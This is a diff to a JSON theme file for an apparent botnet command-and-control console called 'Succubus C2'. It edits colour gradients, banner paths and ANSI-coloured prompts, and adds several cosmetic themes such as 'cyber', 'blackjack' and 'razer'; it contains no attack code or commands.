@@ -1,20 +1,29 @@
 [
     {
         "name":"alternate",
-        "banner":"alt",
+        "banner":"themes/alternate/banner.txt",
         "title":"Succubus C2",
+
+        "help":"helpfile",
+        "methods":"methodsfile",
+        
         "prompt":"[<theme>Succubus</>]> ",
         "description":"alternate succubus theme",
         "gradient":[
             {
-                "r": 255,
-                "g": 70,
-                "b": 19
+                "r": 240,
+                "g": 240,
+                "b": 0
             },
             {
-                "r": 57,
+                "r": 190,
                 "g": 0,
-                "b": 153
+                "b": 170
+            },
+            {
+                "r": 255,
+                "g": 0,
+                "b": 0
             }
         ]
     },
@@ -70,35 +79,129 @@
             }
         ]
     },
-        {
-            "name":"extra",
-            "banner":"extra.txt",
-            "title":"<<$botcount>> devices | Succubus",
-            "prompt":"<theme><<$username>>:~$", 
-            "description":"extra test theme",
-            "prompt gradient":[
-                {
-                    "r": 0,
-                    "g": 255,
-                    "b": 0
-                },
-                {
-                    "r": 20,
-                    "g": 255,
-                    "b": 100
-                }
-            ],
-            "gradient":[
-                {
-                    "r": 0,
-                    "g": 255,
-                    "b": 0
-                },
-                {
-                    "r": 20,
-                    "g": 255,
-                    "b": 100
-                }
-            ]
-        }
+    {
+        "name":"cyber",
+        "banner":"themes/cyberdeck/banner.txt",
+        "title":"CyDeck HMI",
+        "prompt":"<cyber><<$username>>@CyberDeck</> > ", 
+        "description":"for those who are leet",
+        "gradient":[
+            {
+                "r": 163,
+                "g": 78,
+                "b": 78
+            },
+            {
+                "r": 0,
+                "g": 251,
+                "b": 255
+            }
+        ]
+    },
+    {
+        "name":"blackjack",
+        "banner":"themes/blackjack/banner.txt",
+        "title":"Gambling <<$spinner>> | Username <<$username>>",
+        "prompt":" ESC[0m[ESC[38;5;8m♠ESC[38;5;1m♥ESC[38;5;8m♣ESC[38;5;1m♦ESC[0m] - ESC[38;5;8m<<$username>> ESC[0m>", 
+        "description":"if you like to lose",
+        "gradient":[
+            {
+                "r": 255,
+                "g": 0,
+                "b": 0
+            },
+            {
+                "r": 75,
+                "g": 75,
+                "b": 75
+            }
+        ]
+    },
+    {
+        "name":"flavors",
+        "banner":"themes/flavors/banner.txt",
+        "title":"Flalalavor",
+        "prompt":"ESC[38;2;126;211;247m<<$username>> ESC[38;2;247;126;245m• ESC[38;2;154;247;126mFlavor ESC[38;2;126;247;215m• ESC[38;2;128;126;247m» ", 
+        "description":"pleasent and colorful",
+        "gradient":[
+            {
+               "r": 126,
+                "g": 211,
+                "b": 247
+            },
+            {
+                "r": 247,
+                "g": 126,
+                "b": 245
+            },
+            {
+                "r": 154,
+                "g": 247,
+                "b": 126
+            },
+            {
+                "r": 231,
+                "g": 237,
+                "b": 126
+            },
+            {
+                "r": 184,
+                "g": 126,
+                "b": 237
+            },
+            {
+                "r": 126,
+                "g": 247,
+                "b": 215
+            },
+            {
+                "r": 128,
+                "g": 126,
+                "b": 247
+            }
+        ]
+    },
+    {
+        "name":"razer",
+        "banner":"themes/razer/banner.txt",
+        "title":"Razer | <<$username>>",
+        "prompt":"ESC[0m[ESC[31mRESC[32mGESC[34mBESC[32mESC[0m] > ", 
+        "description":"gamer rgb",
+        "gradient":[
+            {
+                "r": 255,
+                "g": 0,
+                "b": 0
+            },
+            {
+                "r": 0,
+                "g": 255,
+                "b": 0
+            },
+            {
+                "r": 0,
+                "g": 0,
+                "b": 255
+            }
+        ]
+    },
+    {
+        "name":"outdated",
+        "banner":"themes/outdated/banner.txt",
+        "title":"localhost",
+        "prompt":"ESC[0m<<$username>>@localhost~# ", 
+        "description":"leet simple",
+        "gradient":[
+            {
+                "r": 255,
+                "g": 255,
+                "b": 255
+            },
+            {
+                "r": 255,
+                "g": 255,
+                "b": 255
+            }
+        ]
+    }
 ]
